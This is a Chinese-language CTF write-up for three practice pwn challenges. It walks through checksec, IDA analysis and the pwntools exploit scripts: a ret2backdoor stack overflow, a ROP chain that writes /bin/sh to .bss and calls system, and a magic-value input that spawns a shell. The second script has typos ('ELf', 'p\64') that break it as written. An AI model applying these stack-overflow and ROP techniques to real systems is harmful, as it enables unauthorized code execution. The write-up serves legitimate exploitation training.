# A&D月赛题的复现：

**一般做pwn题的步骤：**

**1.** *先chicksec elf二进制文件*

**2.** *拖入ida看伪代码，查看都有啥函数，看到底用那种方法做。*

**3.** *写exp，边看边写exp*

## 1.worst

### 1.查看保护

![屏幕截图 2024-03-31 094113](C:\Users\32566\Pictures\Screenshots\屏幕截图 2024-03-31 094113.png)

64位，开启了nx保护，NX保护：**是否启用内存不可执行保护**，*栈上数据不可执行*

Partial RELRO:**got的开头部分被设置为只读，其余部分仍可写**

Full RELRO:**got和plt都为只读，这种状态可以防止对这些结构的修改**

### 2.拖入ida进行分析

![屏幕截图 2024-03-31 094447](C:\Users\32566\Pictures\Screenshots\屏幕截图 2024-03-31 094447.png)

从这里我们可以看出偏移为8，有read危险函数，可以造成栈溢出

![屏幕截图 2024-03-31 094454](C:\Users\32566\Pictures\Screenshots\屏幕截图 2024-03-31 094454.png)

然后咱们把函数表每个函数都看一下发现tip函数里面有：

![屏幕截图 2024-03-31 094504](C:\Users\32566\Pictures\Screenshots\屏幕截图 2024-03-31 094504.png)

后门函数

### 3.写exp

**咱们还要查一下ret**

`ROPgadget --binary worst --only 'pop|ret'`

![屏幕截图 2024-03-31 100351](C:\Users\32566\Pictures\Screenshots\屏幕截图 2024-03-31 100351.png)

```python
from pwn import*
context(arch='amd64',os='linux',log_level='debug')
p=process('./worst')
offest=8
tip=0x401156
ret=0x40101a
payload=cyclic(offest)+p64(ret)+p64(tip)  #通过栈溢出将返回地址覆盖到tip
p.sendline(payload)
p.interactive()
```

![屏幕截图 2024-03-31 102438](C:\Users\32566\Pictures\Screenshots\屏幕截图 2024-03-31 102438.png)

**咱们再说一下为啥要加ret了**

在ubuntu18以上版本的系统中，system函数有条指令要求rsp关于0x10字节对齐。加入ret使栈顶被迫下移8个字节，使之对齐16byte。

**题目在这里**：

链接：https://pan.baidu.com/s/183Tn9EDN4hV91PED5XzPzA?pwd=otfr 
        提取码：otfr

## 2.worst—pro

### 1.checksec pwn20

![屏幕截图 2024-03-31 114133](C:\Users\32566\Pictures\Screenshots\屏幕截图 2024-03-31 114133.png)

### 2.ida伪代码

![屏幕截图 2024-03-31 114204](C:\Users\32566\Pictures\Screenshots\屏幕截图 2024-03-31 114204.png)

典型的漏洞函数read，偏移量也是8，可以构造栈溢出

![屏幕截图 2024-03-31 114212](C:\Users\32566\Pictures\Screenshots\屏幕截图 2024-03-31 114212.png)

我们发现有system但是没有bin/sh。那么怎么办了。

栈溢出后我们再次调用一下read函数写入/bin/sh，这样的话，问题就解决了

### 3.exp

![屏幕截图 2024-03-31 115350](C:\Users\32566\Pictures\Screenshots\屏幕截图 2024-03-31 115350.png)

查一下rdi,rsi等寄存器的值，因为**64位传参要用到这些寄存器**

```python
from pwn import*
context(arch='amd64',os='linux',log_level='debug')
p=process('./pwn20')   #为了好写我就改为pwn20了
elf=ELf('./pwn20')
read=elf.plt['read']
offest=8
tip=0x401156
rdi=0x401179
rsi=0x40117b
bss=elf.bss()  #因为bss段为未初始化的全局变量和静态变量，通常情况下是不能向bss段些东西的，但在一些#特殊情况下，比如攻击者利用栈溢出等手段修改bss段内容是可以的
payload=cyclic(offest)+p64(rdi)+p64(0x0)+p64(rsi)+p64(bss)+p64(read)+p64(rdi)+p64(bss)+p\64(tip)        #先是栈溢出，read有两个参数，rdi将0传给read，作为read的第一个参数，表示输入，rsi
#将bss作为read的第二个参数，就是输入地址，然后调用read函数进行输入，最后通过rdi将bss传给system
p.sendline(payload)
p.sendline(b"/bin/sh\x00")
p.interactive()
```

*咱们接着说64位传参和32位传参*

**64传参是通过寄存器传参的，rdi,rsi,rdx,rcx,r8,r9,其余参数放在栈中，64位先传参再调用函数**

**32位传参是通过栈传参，32位是先调用函数后传参**

**题目在这里：**

链接：https://pan.baidu.com/s/1bo8s-XMUIymRXz_0Qy7RWw?pwd=hbwm 
        提取码：hbwm

## 3.number

### 1.checksec

![屏幕截图 2024-03-31 140735](C:\Users\32566\Pictures\Screenshots\屏幕截图 2024-03-31 140735.png)

**保护全开逆天了**

### 2.ida看伪代码

![屏幕截图 2024-03-31 141430](C:\Users\32566\Pictures\Screenshots\屏幕截图 2024-03-31 141430.png)

read函数，当读入buf=0x12345678的时候，会直接返回到system("/bin/sh")

这个不需要进行栈溢出。

有些人可能是这样的

![屏幕截图 2024-03-31 142317](C:\Users\32566\Pictures\Screenshots\屏幕截图 2024-03-31 142317.png)

**单机305419896，并单击右键，有个hexadecimal，单机它，就会变成16进制**

### 3.exp

```python
from pwn import*
p=process('./qiandao')
p.sendline(p64(0x12345678))
p.interactive()
```

![屏幕截图 2024-03-31 142151](C:\Users\32566\Pictures\Screenshots\屏幕截图 2024-03-31 142151.png)

**题目在这：**

链接：https://pan.baidu.com/s/1RCWfxmOZmgympTE8juIo2Q?pwd=hwum 
        提取码：hwum